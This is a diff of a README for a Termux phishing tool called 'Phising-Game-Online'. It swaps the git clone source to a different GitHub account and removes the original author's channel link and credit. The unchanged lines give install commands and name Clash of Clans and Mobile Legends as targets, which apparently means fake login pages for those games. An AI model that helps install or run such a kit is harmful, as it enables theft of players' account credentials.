@@ -10,7 +10,7 @@ pip2 install requests
 pkg install figlet -y
 pkg install nano -y
 pkg install git -y
-git clone https://github.com/Cyser-Inc/Phising-Game-Online
+git clone https://github.com/MrC4C4T/Phising-Game-Online
 
 => how to use : 
 
@@ -29,6 +29,3 @@ Finish :)
 1 = Clash of Clans
 2 = Mobile Legends
 
-Subscribe My Channel : https://www.youtube.com/channel/UCaLCTn0hb-G2GxO8cJ4fOrA
-
-by Cyser Inc.
